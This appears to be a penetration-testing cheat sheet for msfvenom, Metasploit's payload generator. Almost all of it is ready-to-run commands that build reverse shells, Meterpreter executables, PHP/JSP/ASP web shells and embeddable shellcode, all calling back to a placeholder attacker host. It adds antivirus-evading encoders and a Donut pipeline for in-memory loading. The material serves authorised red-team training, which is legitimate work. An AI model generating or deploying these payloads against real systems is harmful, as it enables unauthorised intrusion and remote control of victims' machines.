# 05.04 msfvenom

> Generate raw payloads, encoded shellcode, weaponized binaries — every common payload format Metasploit supports.

## Overview

msfvenom is the payload-generation arm of Metasploit. Generates reverse shells (TCP/HTTPS/DNS), Meterpreter staged/stageless, command stagers, exe/dll/elf/macho binaries, and raw shellcode in formats matching every language (C, Python, PowerShell, Ruby, Go, Java). Combined with Metasploit's multi/handler for catching.

## Steps

- **Step 1** - Pick payload type (`-p windows/x64/...` or `cmd/unix/...`).
- **Step 2** - Set LHOST + LPORT.
- **Step 3** - Pick format (-f exe/elf/raw/c/python/etc.).
- **Step 4** - Save with -o.
- **Step 5** - Encode with -e (shikata_ga_nai for x86, x64/zutto_dekiru for x64) — but encoders are signatured, so only useful for AV-naive targets.

## Commands

### List payloads

```bash
msfvenom --list payloads
msfvenom --list payloads | grep windows/x64/meterpreter
```

### Reverse Meterpreter HTTPS

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER> LPORT=443 -f exe -o shell.exe
```

### Reverse shell (TCP)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER> LPORT=4444 -f exe -o rev.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER> LPORT=4444 -f elf -o rev.elf
```

### Web shells

```bash
msfvenom -p php/reverse_php LHOST=<ATTACKER> LPORT=4444 -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER> LPORT=4444 -f raw > shell.jsp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER> LPORT=4444 -f asp > shell.asp
```

### Shellcode for embedding

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER> LPORT=443 -f c     # C array
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER> LPORT=443 -f python  # Python
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER> LPORT=443 -f raw -o sc.bin
```

### Bad-char excluded

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER> LPORT=4444 -f c -b '\x00\x0a\x0d\x25' EXITFUNC=thread
```

### Encoded (Shikata)

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER> LPORT=443 -e x64/xor_dynamic -i 5 -f exe -o stage.exe
```

### Pipeline: msfvenom → Donut → shellcode runner

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER> LPORT=443 -f raw -o sc.bin
# Donut for in-memory loading
./donut -f 1 -i sc.bin -o sc_donut.bin
```
